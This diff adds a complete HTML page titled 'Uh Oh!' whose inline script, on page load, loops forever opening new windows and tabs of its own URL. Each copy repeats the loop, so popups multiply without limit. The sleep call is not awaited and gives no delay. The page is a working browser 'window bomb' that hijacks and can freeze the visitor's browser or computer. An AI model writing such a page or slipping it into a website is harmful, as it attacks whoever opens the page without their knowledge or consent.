@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Uh Oh!</title>
+</head>
+<body>
+    <a>HeHaw.</a>
+    <script>
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        var currentURL = window.location.href;
+    
+        while (true) {
+            sleep(1)
+            window.open(currentURL, "_blank", "width=800,height=600");
+            window.open(currentURL, "_blank");
+        }
+    </script>
+</body>
+</html>
